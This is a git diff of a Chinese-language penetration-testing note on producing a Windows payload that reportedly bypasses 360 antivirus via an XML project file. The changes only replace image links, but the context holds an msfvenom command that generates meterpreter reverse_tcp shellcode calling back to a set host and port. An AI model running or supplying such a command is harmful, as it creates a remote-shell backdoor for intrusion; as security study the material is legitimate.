@@ -40,7 +40,7 @@ windows 安全日志（需要自行配置）据称可以绕过360，待确认
 msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f csharp
 ```
 
-![载荷](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70.png)
+![载荷](https://camo.githubusercontent.com/80941d1f884f9dd054633cf080cf3b7945eacd9e6143f5b0f2deeb1042291cef/68747470733a2f2f696d672d626c6f672e6373646e696d672e636e2f32303230303431333133353131363339382e706e673f782d6f73732d70726f636573733d696d6167652f77617465726d61726b2c747970655f5a6d46755a33706f5a57356e6147567064476b2c736861646f775f31302c746578745f6148523063484d364c7939696247396e4c6d4e7a5a473475626d56304c334678587a4d324d7a4d304e4459302c73697a655f31362c636f6c6f725f4646464646462c745f3730)
 
 #### XML文件设置
 
@@ -110,7 +110,7 @@ msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192
   </Project>
 ```
 
-![XML文件设置](https://image-host-toky.oss-cn-shanghai.aliyuncs.com/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0,size_16,color_FFFFFF,t_70-20210720144459841.png)
+
 
 #### 设置监听
 
